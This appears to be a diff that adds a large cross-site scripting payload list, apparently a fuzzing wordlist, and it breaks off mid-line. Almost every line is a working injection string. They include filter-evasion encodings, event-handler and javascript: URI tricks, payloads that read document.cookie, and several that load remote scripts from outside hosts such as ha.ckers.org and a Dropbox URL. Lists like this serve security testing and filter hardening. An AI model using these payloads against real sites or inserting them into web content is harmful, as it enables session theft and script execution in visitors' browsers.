+<a href="\x07javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x15javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<body BACKGROUND="javascript:document.vulnerable=true;">
+exp/*&lt;A STYLE='no\xss&#58;noxss(\"*//*\");
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<![><img src="]><img src=x onerror=javascript:alert(1)//">
+<"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+<style></style\x0D<img src="about:blank" onerror=javascript:alert(1)//></style>
+<IMG SRC=x onmessage="alert(String.fromCharCode(88,83,83))">
+<a href="\x1Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+</script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>
+<a href="\x0Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<form><button formaction=javascript&colon;alert(1)>CLICKME
+<body onfocus body onfocus="javascript:javascript:alert(1)"></body onfocus>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<img/src=@&#32;&#13; onerror = prompt('&#49;')
+></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+&#X0003c;
+`"'><img src=xxx:x onerror\x20=javascript:alert(1)>
+<script itworksinallbrowsers>/*<script* */alert(1)</script
+<body onkeydown body onkeydown="javascript:javascript:alert(1)"></body onkeydown>
+<;SCRIPT>;alert(';XSS';)<;/SCRIPT>;
+<li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)></div>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC="javascript:javascript:alert(1)"
+"'`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<XSS STYLE="xss:expression(alert('XSS'))">
+<XSS STYLE="behavior: url(xss.htc);">
+<a href="\x04javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+</ foo="><script>alert(1)</script>">
+<a href="javascript#document.vulnerable=true;">
+<IMG DYNSRC=\"javascript:alert('XSS')\">
+</html>
+<script ~~~>alert(0%0)</script ~~~>
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<!--[if gte IE 4]><SCRIPT>javascript:alert(1);</SCRIPT><![endif]-->
+</XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
+<html onMouseWheel html onMouseWheel="javascript:javascript:alert(1)"></html onMouseWheel>
+<font style='color:expression(alert(document.cookie))'>
+<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
+<IMG LOWSRC=\"javascript:alert('XSS')\">
+<A HREF="htt p://6 6.000146.0x7.147/">XSS</A>
+<a href="\x07javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+xss&#58;ex&#x2F;*XSS*//*/*/pression(alert(\"XSS\"))'&gt;
+<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>
+"'`><\x00img src=xxx:x onerror=javascript:alert(1)>
+&#060
+<script ^__^>alert(String.fromCharCode(49))</script ^__^
+<object classid="clsid:..." codebase="javascript:document.vulnerable=true;">
+<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>
+"`'><script>\x0Cjavascript:alert(1)</script>
+'"></title><script>alert(1337)</script>><marquee><h1>XSS by xss</h1></marquee>
+<a href="\xE2\x80\xA9javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+"><img src=x onerror=javascript:alert(('1'))>
+1%22onfocus=%27window.alert%28document.cookie%29%27%20autofocus=
+<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
+<IMG SRC=" &#14;  javascript:alert('XSS');">
+&#x3c;
+<IMG SRC="jav ascript:javascript:alert(1);">
+&lt;OBJECT classid=clsid&#58;ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript&#058;alert('XSS')&gt;&lt;/OBJECT&gt;
+<IMG SRC=x ondblclick="alert(String.fromCharCode(88,83,83))">
++ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-
+ABC<div style="x:\xE2\x80\x85expression(javascript:alert(1)">DEF
+`"'><img src=xxx:x onerror\x0A=javascript:alert(1)>
+&lt;IMG SRC=&quot;livescript:[code]&quot;&gt;
+<script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"></script onReadyStateChange>
+<IMG onmouseover="alert('xxs')">
+a=\"get\";
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
+<IMG SRC=”javascript:alert(‘XSS’)”
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
+<IMG SRC=" &#14;  javascript:alert('XSS');">
+<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
+ABC<div style="x:expression\x5C(javascript:alert(1)">DEF
+&lt;SCRIPT a=`&gt;` SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script
+<body ONLOAD=document.vulnerable=true;>
+&lt;A HREF=\"http&#58;//www&#46;gohttp&#58;//www&#46;google&#46;com/ogle&#46;com/\"&gt;XSS&lt;/A&gt;
+<a href="\xE2\x80\x88javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
+<script src="data:text/javascript,alert(1)"></script>
+"`'><script>\xE2\x80\x86javascript:alert(1)</script>
+<IMG SRC="javascript:alert('XSS')"
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<IMG SRC= onmouseover="alert('xxs')">
+<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<IMG onmouseover="alert('xxs')">
+<script src="data:text/javascript,alert(1)"></script>
+&lt;INPUT TYPE=\"IMAGE\" SRC=\"javascript&#058;alert('XSS');\"&gt;
+<form><a href="javascript:\u0061lert&#x28;1&#x29;">X</script><img/*/src="worksinchrome&colon;prompt&#x28;1&#x29;"/*/onerror='eval(src)'>
+<SCRIPT onreadystatechange=javascript:javascript:alert(1);></SCRIPT>
+<img src=`xx:xx`onerror=alert(1)>
+<meta HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>document.vulnerable=true</SCRIPT>">
+<svg onunload svg onunload="javascript:javascript:alert(1)"></svg onunload>
+<script\x0Ctype="text/javascript">javascript:alert(1);</script>
+'';!--"<XSS>=&{()}
+<HTML xmlns:xss><?import namespace="xss" implementation="http://www.securitycompass.com/xss.htc"><xss:xss>XSS</xss:xss></html>
+<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
+"`'><script>\x09javascript:alert(1)</script>
+<body onMouseOver body onMouseOver="javascript:javascript:alert(1)"></body onMouseOver>
+<embed src=%(jscript)s></embed>
+<--`<img/src=` onerror=alert(1)> --!>
+<XSS STYLE="xss:expression(document.vulnerable=true)">
+&lt;A HREF=\"http&#58;//0x42&#46;0x0000066&#46;0x7&#46;0x93/\"&gt;XSS&lt;/A&gt;
+&lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:alert(&apos;XSS&apos;))&quot;&gt;
+<IMG STYLE="xss:expr/*XSS*/ession(javascript:alert(1))">
+<x style="behavior:url(%(sct)s)">
+<a href="javascript:javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A">
+<script>({0:#0=alert/#0#/#0#(0)})</script>
+<body onLoad="while(true) alert('XSS');">
+<;SCRIPT a=";>';>"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
+<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
+<li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)></div>
+<IMG SRC=x oncontextmenu="alert(String.fromCharCode(88,83,83))">
+<iframe onload iframe onload="javascript:javascript:alert(1)"></iframe onload>
+<object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
+<IMG SRC=`javascript:javascript:alert(1)`>
+//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
+&LT
+\\";alert('XSS');//
+<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>
+<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">
+<IMG SRC="javascript:alert('XSS');">
+<DIV STYLE="width: expression(alert('XSS'));">
+<IMG SRC="javascript:javascript:alert(1);">
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+"><img src=x onerror=window.open('https://www.google.com/');>
+<style>.XSS{background-image:url("javascript:document.vulnerable=true");}</STYLE><A CLASS=XSS></a>
+<input value=<><iframe/src=javascript:confirm(1)
+<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
+<IMG SRC=x onbeforeprint="alert(String.fromCharCode(88,83,83))">
+<iframe style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
+`"'><img src=xxx:x onerror\x0D=javascript:alert(1)>
+alert(String.fromCharCode(88,83,83));'))">
+<IMG SRC='vbscript:msgbox("XSS")'>
+<!</textarea <body onload='alert(1)'>
+<IMG SRC=x onafterprint="alert(String.fromCharCode(88,83,83))">
+<a href="\xE2\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<script\x3Etype="text/javascript">javascript:alert(1);</script>
+<IMG SRC=" &#14;  javascript:alert('XSS');">
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+"<!--><Svg OnLoad=confirm?.(/d3rk😈/)<!--1")"<!--><Svg+OnLoad=confirm?.(/d3rk😈/)<!--
+<img SRC='vbscript:document.vulnerable=true;'>
+<div style="font-family:'foo&#10;;color:red;';">XXX
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<frameset onload=alert(123)>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<script src="/\%(jscript)s"></script>
+&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:alert(&apos;XSS&apos;);&quot;&gt;
+<svg/onload​=prompt()>
+&lt;br size=\&quot;&amp;{alert(&#039;XSS&#039;)}\&quot;&gt;
+<TABLE><TD BACKGROUND="javascript:javascript:alert(1)">
+<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
+"`'><script>\xE2\x80\xA9javascript:alert(1)</script>
+&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;
+"><s"%2b"cript>alert(document.cookie)</script>
+<script>if("x\\xE0\xB9\x92".length==2) { javascript:alert(1);}</script>
+`"'><img src=xxx:x \x20onerror=javascript:alert(1)>
+&lt;IMG SRC=&quot; &amp;#14;  javascript:alert(&apos;XSS&apos;);&quot;&gt;
+<form><button formaction=javascript&colon;alert(1)>CLICKME
+<audio src=1 onerror=alert(1)>
+<IMG SRC="jav&#x0A;ascript:alert(<WBR>'XSS');">
+<IMG SRC=x onseeked="alert(String.fromCharCode(88,83,83))">
+<object onbeforeload object onbeforeload="javascript:javascript:alert(1)"></object onbeforeload>
+<div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+<iframe srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;>">
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:alert(&apos;XSS&apos;)&gt;&lt;/OBJECT&gt;
+<IMG SRC=x onclick="alert(String.fromCharCode(88,83,83))">
+<;BASE HREF=";javascript:alert(';XSS';);//";>;
+<object data="data:text/html;base64,%(base64)s">
+<body ONLOAD=document.vulnerable=true;>
+<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+&#X03C;
+<BGSOUND SRC="javascript:alert('XSS');">
+foo<script>alert(1)</script>
+<IMG SRC=x onpagehide="alert(String.fromCharCode(88,83,83))">
+<iframe/%00/ src=javaSCRIPT&colon;alert(1)
+&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js?&lt;B&gt;
+<form><button formaction=javascript&colon;alert(1)>CLICKME
+}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>
+<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
+<;IMG RC=&;#0000106&;#0000097&;#0000118&;#0000097&;#0000115&;#0000099&;#0000114&;#0000105&;#0000112&;#0000116&;#0000058&;#0000097&;#0000108&;#0000101&;#0000114&;#0000116&;#0000040&;#0000039&;#0000088&;#0000083&;#0000083&;#0000039&;#0000041>;
+<? foo="><x foo='?><script>alert(1)</script>'>">
+<embed code=javascript:javascript:alert(1);></embed>
+<img\x47src=x onerror="javascript:alert(1)">
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+<svg/onload=%26%23097lert%26lpar;1337)>
+<;INPUT TYPE=";IMAGE"; SRC=";javascript:alert(';XSS';);";>;
+ABC<div style="x:\xE2\x80\x87expression(javascript:alert(1)">DEF
+<div/style="width:expression(confirm(1))">X</div> {IE7}
+<img src="javascript:alert('XSS')">
+<link rel="stylesheet" href="javascript:document.vulnerable=true;">
+<style>BODY{-moz-binding:url("http://www.securitycompass.com/xssmoz.xml#xss")}</style>
+&lt;STYLE&gt;.XSS{background-image:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
+'"></title><script>alert("XSS by \nxss")</script>><marquee><h1>XSS by xss</h1></marquee>
+<IMG SRC=x onmousewheel="alert(String.fromCharCode(88,83,83))">
+<STYLE>@import'%(css)s';</STYLE>
+<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
+<img src=x\x13onerror="javascript:alert(1)">
+<;META HTTP-EQUIV=";Set-Cookie"; Content=";USERID=<;SCRIPT>;alert(';XSS';)<;/SCRIPT>;";>;
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<iframe src="javascript:document.vulnerable=true; <
+<%<!--'%><script>alert(1);</script -->
+<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
+<video src=1 href=1 onerror="javascript:alert(1)"></video>
+<script>if("x\\xEE\xA9\x93".length==2) { javascript:alert(1);}</script>
+element[attribute='<img src=x onerror=alert('XSS');>
+&lt;IMG STYLE=\"xss&#58;expr/*XSS*/ession(alert('XSS'))\"&gt;
+&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert(&apos;XSS&apos;);&lt;/STYLE&gt;
+<mark onfocus=alert(1) autofocus tabindex=1>	
+&lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;&quot;&gt;
+&lt;IMG SRC=\"   javascript&#058;alert('XSS');\"&gt;
+&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+<body onLoad body onLoad="javascript:javascript:alert(1)"></body onLoad>
+<SCRIPT SRC=//ha.ckers.org/.j>
+<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
+&lt;BR SIZE=\"&{alert('XSS')}\"&gt;
+<a href="\xE2\x80\x85javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+%253cscript%253ealert(document.cookie)%253c/script%253e
+"-prompt(8)-"
+&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
+<body onResize body onResize="javascript:javascript:alert(1)"></body onResize>
+veris-->group<svg/onload=alert(/XSS/)//
+<iframe src=%(scriptlet)s <
+`"'><img src=xxx:x \x09onerror=javascript:alert(1)>
+&lt;EMBED SRC=&quot;http://ha.ckers.org/xss.swf&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt;
+<;STYLE>;@import';http://ha.ckers.org/xss.css';;<;/STYLE>;
+<a href="jav&#65ascript:javascript:alert(1)">test1</a>
+IMG+LOWSRC="javascript:alert(1);">
+1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`>
+<iframe src="vbscript:document.vulnerable=true;">
+<style>@import "data:,*%7bx:expression(javascript:alert(1))%7D";</style>
+ibro"*alert(1)*"
+<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<script a=">'>" SRC="http://www.securitycompass.com/xss.js"></script>
+"/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x />
+<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
+<input value=<><iframe/src=javascript:confirm(1)
+<body onload body onload="javascript:javascript:alert(1)"></body onload>
+<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>
+<style><img src="</style><img src=x onerror=javascript:alert(1)//">
+<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
+ABC<div style="x:\x09expression(javascript:alert(1)">DEF
+<script>document.vulnerable=true;</script>
+&lt;SCRIPT&gt;alert(/XSS/&#46;source)&lt;/SCRIPT&gt;
+<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<iframe src=http://xss.rocks/scriptlet.html <
+<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<a href="\x0Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<div style="binding: url([link to code]);">
+<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+<a href="\x10javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<script\x2Ftype="text/javascript">javascript:alert(1);</script>
+"><h1><IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>123</h1>
+&lt;IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29&gt;
+<FRAMESET><FRAME SRC="javascript:document.vulnerable=true;"></frameset>
+<img src="javascript:alert(1)">
+"><script>alert('XSS')</script>
+<script\x20type="text/javascript">javascript:alert(1);</script>
+<img \x34src=x onerror="javascript:alert(1)">
+<OBJECT TYPE="text/x-scriptlet" DATA="http://www.securitycompass.com/scriptlet.html"></object>
+<img src="livescript:document.vulnerable=true;">
+<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
+<img\x13src=x onerror="javascript:alert(1)">
+&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;
+<IMG SRC=JaVaScRiPt:alert(&quot;XSS<WBR>&quot;)>
+&lt;!--#exec cmd=&quot;/bin/echo &apos;&lt;SCRIPT SRC&apos;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &apos;=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;&apos;&quot;--&gt;
+<img src/onerror=alert(1)>
+<script src="data:text/plain\x2Cjavascript:alert(1)"></script>
+<img dynsrc="javascript:document.vulnerable=true;">
+"`'><script>\xEF\xBF\xAEjavascript:alert(1)</script>
+<audio src/onerror=alert(1)>	
+"/></a></><img src=1.gif onerror=alert(1)>
+&#x00003c;
+<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
+<a href="javas\x00cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<img src=`xx:xx`onerror=alert(1)>
+<STYLE>a{background:url('s1' 's2)}@import javascript:javascript:alert(1);');}</STYLE>
+<iframe/onreadystatechange=alert(1)
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))<?/SCRIPT>&submit.x=27&submit.y=9&cmd=search
+<style></style\x20<img src="about:blank" onerror=javascript:alert(1)//></style>
+"`'><script>\x0Djavascript:alert(1)</script>
+ABC<div style="x:\x20expression(javascript:alert(1)">DEF
+&#x003C
+<! foo="><script>javascript:alert(1)</script>">
+"`'><script>\x21javascript:alert(1)</script>
+<IMG LOWSRC="javascript:javascript:alert(1)">
+<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
+<div style="font-family:foo}color=red;">XXX
+<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
+<IMG STYLE="xss:expr/*XSS*/ession(javascript:alert(1))">
+<IMG SRC=”jav ascript:alert(‘XSS’);”>
+&lt;HTML xmlns:xss&gt;
+<body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)"></body onPropertyChange>
+"`'><script>\x00javascript:alert(1)</script>
+"`'><script>\xE1\x9A\x80javascript:alert(1)</script>
+<;OBJECT TYPE=";text/x-scriptlet"; DATA=";http://ha.ckers.org/scriptlet.html";>;<;/OBJECT>;
+%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E
+<a href="\x0Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<IMG SRC=javascript:alert("XSS")>
+</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
+<iframe src=http://ha.ckers.org/scriptlet.html <
+<;LINK REL=";stylesheet"; HREF=";javascript:alert(';XSS';);";>;
+perl -e 'print \"<IMG SRC=java\0script:alert(\"XSS\")>\";' > out
+xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
+"`'><script>\xE2\x80\x89javascript:alert(1)</script>
+&#x0003C
+<;SCRIPT a=";>;"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
+<INPUT TYPE=”IMAGE” SRC=”javascript:alert(‘XSS’);”>
+>%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>
+onpointerover=”alert(‘XSS’)
+`"'><img src=xxx:x \x00onerror=javascript:alert(1)>
+<IMG SRC=x onload="alert(String.fromCharCode(88,83,83))">
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+<;IMG SRC=";livescript:[code]";>;
+<IMG SRC="jav	ascript:alert('XSS');">
+</title><script>alert(/xss/)</script>
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+"></iframe><script>alert(123)</script>
+--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->
+<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>
+<math><a xlink:href="//jsfiddle.net/t846h/">click
+"><script alert(String.fromCharCode(88,83,83))</script>
+<img src="x` `<script>javascript:alert(1)</script>"` `>
+<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
+<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
+<img\x32src=x onerror="javascript:alert(1)">
+<embed type="image" src=%(scriptlet)s></embed>
+<A HREF="http://66.102.7.147/">XSS</A>
+"><script>alert(1337)</script>"><script>alert("XSS by \nxss</h1></marquee>
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+"`'><script>\xE2\x80\x85javascript:alert(1)</script>
+ABC<div style="x:\x0Aexpression(javascript:alert(1)">DEF
+<img src\x32=x onerror="javascript:alert(1)">
+<a href="javas\x01cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<XSS STYLE="xss:expression(javascript:alert(1))">
+<script>javascript:alert(1)</script\x0B
+<img LOWSRC="javascript:document.vulnerable=true;">
+<;SCRIPT SRC=http://ha.ckers.org/xss.js
+<a href="\xE2\x80\x8Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x1Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<;BODY BACKGROUND=";javascript:alert(';XSS';);";>;
+<img DYNSRC="javascript:document.vulnerable=true;">
+<img src\x11=x onerror="javascript:alert(1)">
+<body onload="document.vulnerable=true;">
+<IMG SRC=x onseeking="alert(String.fromCharCode(88,83,83))">
+ABC<div style="x:\xE2\x80\x86expression(javascript:alert(1)">DEF
+&#X3c
+`"'><img src=xxx:x \x22onerror=javascript:alert(1)>
+</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
+&#x0003C;
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<script src=1 href=1 onerror="javascript:alert(1)"></script>
+<IMG SRC=x onreset="alert(String.fromCharCode(88,83,83))">
+<image src=1 href=1 onerror="javascript:alert(1)"></image>
+"><h1><iframe width="420" height="315" src="http://www.youtube.com/embed/sxvccpasgTE" frameborder="0" allowfullscreen></iframe>123</h1>
+<SCRIPT/SRC="%(jscript)s"></SCRIPT>
+&#X003c
+<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
+<IMG SRC=x onvolumechange="alert(String.fromCharCode(88,83,83))">
+<body/onload=&lt;!--&gt;&#10alert(1)>
+<? foo="><script>alert(1)</script>">
+&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
+<a href="javas\x0Acript:javascript:alert(1)" id="fuzzelement1">test</a>
+\";alert('XSS');//
+<iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"></iframe onReadyStateChange>
+<form><isindex formaction="javascript&colon;confirm(1)"
+<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&T